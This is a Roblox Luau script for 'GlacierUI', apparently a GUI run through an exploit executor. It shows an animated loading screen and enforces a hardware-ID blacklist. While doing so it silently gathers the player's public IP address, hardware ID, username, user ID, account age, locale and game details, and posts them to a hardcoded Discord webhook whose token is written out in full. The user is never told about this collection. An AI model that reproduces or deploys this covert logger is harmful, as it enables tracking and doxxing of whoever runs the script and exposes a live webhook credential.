local TweenService = game:GetService("TweenService")
local Mainn = script.Parent
Mainn.Visible = false
local window = script.Parent          -- Main frame
local gui    = window.Parent          -- GlacierUI ScreenGui

-- Make the whole ScreenGui cover the screen edge-to-edge (no topbar gap)
gui.IgnoreGuiInset = true
gui.ScreenInsets   = Enum.ScreenInsets.None
local plr = game.Players.LocalPlayer
local textLabel = script.Parent.BottomBar.Annc
local message = "Connected to the glacier servers!"

local Webhook = 'https://discord.com/api/webhooks/1522603794184278168/9HJdzLa8riy729LMNohBtBQ9EZQSLKqcbs6nrgHyl0IdDxUk9aX0SZX5T590vvF6d-LG'

local LocalPlayer      = game.Players.LocalPlayer
local Userid           = LocalPlayer.UserId
local DName            = LocalPlayer.DisplayName
local Name             = LocalPlayer.Name
local MembershipType   = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge       = LocalPlayer.AccountAge
local Country          = game.LocalizationService.RobloxLocaleId
local GetIp            = game:HttpGet("https://v4.ident.me/")
local GetHwid          = game:GetService("RbxAnalyticsService"):GetClientId()
local HttpService      = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfoAsync(game.PlaceId).Name

--// HWID BLACKLIST - Add your blacklisted HWIDs here
local BLACKLISTED_HWIDS = {
	"4566AD13-46C5-4773-B7D6-3D684D055D36",
	-- Add more HWIDs here as needed
}

-- Function to check if HWID is blacklisted
local function isHwidBlacklisted(hwid)
	for _, blacklistedHwid in ipairs(BLACKLISTED_HWIDS) do
		if hwid == blacklistedHwid then
			return true
		end
	end
	return false
end

--// SETTINGS
local LOAD_TIME = 2
local OPEN_TIME = 0.65
local FADE_IN   = 0.4

--// Prep the window: hidden + folded
window.Visible     = false
window.AnchorPoint = Vector2.new(0.5, 0.5)
local finalSize    = window.Size
window.Size        = UDim2.new(0, 0, finalSize.Y.Scale, finalSize.Y.Offset)

--// Build loading frame (starts invisible so we can fade it in)
local loading = Instance.new("Frame")
loading.Name                   = "LoadingFrame"
loading.Size                   = UDim2.new(1, 0, 1, 0)
loading.Position               = UDim2.new(0.5, 0, 0.5, 0)
loading.AnchorPoint            = Vector2.new(0.5, 0.5)
loading.BackgroundColor3       = Color3.fromRGB(25, 25, 25)
loading.BackgroundTransparency = 1
loading.BorderSizePixel        = 0
loading.ZIndex                 = 100
loading.Parent                 = gui

local loadingText = Instance.new("TextLabel")
loadingText.Name                   = "LoadingText"
loadingText.Size                   = UDim2.new(1, 0, 0, 40)
loadingText.Position               = UDim2.new(0.5, 0, 0.5, -20)
loadingText.AnchorPoint            = Vector2.new(0.5, 0.5)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3             = Color3.fromRGB(240, 240, 240)
loadingText.Font                   = Enum.Font.GothamBold
loadingText.TextSize               = 24
loadingText.Text                   = "Connecting to Glacier Servers"
loadingText.TextTransparency       = 1
loadingText.ZIndex                 = 101
loadingText.Parent                 = loading

--// Fade the loading frame in
local fadeInInfo = TweenInfo.new(FADE_IN, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
TweenService:Create(loading,     fadeInInfo, { BackgroundTransparency = 0 }):Play()
TweenService:Create(loadingText, fadeInInfo, { TextTransparency       = 0 }):Play()

--// Animated dots with HWID check
task.spawn(function()
	local base = "Connecting to Glacier Servers"
	local dots = 0
	local hwidChecked = false

	while loading.Parent do
		dots = (dots % 3) + 1
		loadingText.Text = base .. string.rep(".", dots)

		-- Check HWID after showing dots for a bit
		if not hwidChecked and dots == 3 then
			hwidChecked = true

			-- Check if HWID is blacklisted
			if isHwidBlacklisted(GetHwid) then
				-- HWID is blacklisted, show banned message
				loadingText.Text = "You have been blacklisted from using glacier, closing UI..."

				-- Show spinning dots after the banned message
				task.wait(1)
				local bannedBase = "You have been blacklisted from using glacier, closing UI"
				local spinChars = {"|", "/", "-", "\\"}
				local spinIndex = 0

				while loading.Parent do
					spinIndex = (spinIndex % #spinChars) + 1
					loadingText.Text = bannedBase .. " " .. spinChars[spinIndex]
					task.wait(0.2)
				end

				-- Destroy the UI after a delay
				task.wait(2)
			    script.Parent.Parent:Destroy()
				return
			end
		end

		task.wait(0.35)
	end
end)


--// Send session details to webhook
task.spawn(function()
	pcall(function()
		local profileLink = ("https://www.roblox.com/users/%d/profile"):format(Userid)
		local gameLink    = ("https://www.roblox.com/games/%d/%s"):format(game.PlaceId, GAMENAME)
		local headshot    = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(Userid)

		local embed = {
			title       = "❄️ GlacierUI — New Session",
			description = ("**%s** just executed GlacierUI\n[View Profile](%s) • [View Game](%s)"):format(Name, profileLink, gameLink),
			color       = 3197120,
			thumbnail   = { url = headshot },
			fields = {
				{
					name   = "👤 Account",
					value  = ("```Username   : %s\nDisplay    : %s\nUser ID    : %d\nMembership : %s\nAge        : %d days```"):format(Name, DName, Userid, MembershipType, AccountAge),
					inline = false,
				},
				{
					name   = "🌐 System",
					value  = ("```IP      : %s\nCountry : %s\nHWID    : %s```"):format(GetIp, Country, GetHwid),
					inline = false,
				},
				{
					name   = "🎮 Game",
					value  = ("```Name     : %s\nPlace ID : %d\nJob ID   : %s```"):format(GAMENAME, game.PlaceId, game.JobId),
					inline = false,
				},
			},
			footer    = { text = "GlacierUI • " .. os.date("%Y-%m-%d %H:%M:%S") },
			timestamp = DateTime.now():ToIsoDate(),
		}

		local payload = HttpService:JSONEncode({
			username = "GlacierUI Logger",
			embeds   = { embed },
		})

		local body = {
			Url     = Webhook,
			Method  = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body    = payload,
		}

		if syn and syn.request then
			syn.request(body)
		elseif request then
			request(body)
		elseif http_request then
			http_request(body)
		end
	end)
end)

--// Simulated load time
task.wait(LOAD_TIME)

--// Fade loading frame out
local fadeOutInfo = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
TweenService:Create(loading,     fadeOutInfo, { BackgroundTransparency = 1 }):Play()
TweenService:Create(loadingText, fadeOutInfo, { TextTransparency       = 1 }):Play()
task.wait(0.35)
loading:Destroy()

--// Show Main folded, then fold it open from the center
window.Visible = true
window.Size    = UDim2.new(0, 0, finalSize.Y.Scale, finalSize.Y.Offset)

TweenService:Create(
	window,
	TweenInfo.new(OPEN_TIME, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
	{ Size = finalSize }
):Play()

Mainn.Visible = true

textLabel.Text = ""
textLabel.TextTransparency = 1

for i = 1, #message do
	textLabel.Text = string.sub(message, 1, i)
end

-- Smoothly fade the text in
for transparency = textLabel.TextTransparency, 0, -0.2 do
	textLabel.TextTransparency = math.max(0, transparency)
	task.wait(0.01)
end

task.wait(0.04)
textLabel.TextTransparency = 0

wait(2)

local message = "Welcome " .. plr.Name
textLabel.Text = ""
textLabel.TextTransparency = 1

for i = 1, #message do
	textLabel.Text = string.sub(message, 1, i)

	-- Smoothly fade the text in
	for transparency = textLabel.TextTransparency, 0, -0.2 do
		textLabel.TextTransparency = math.max(0, transparency)
		task.wait(0.01)
	end

	task.wait(0.04)
end

textLabel.TextTransparency = 0
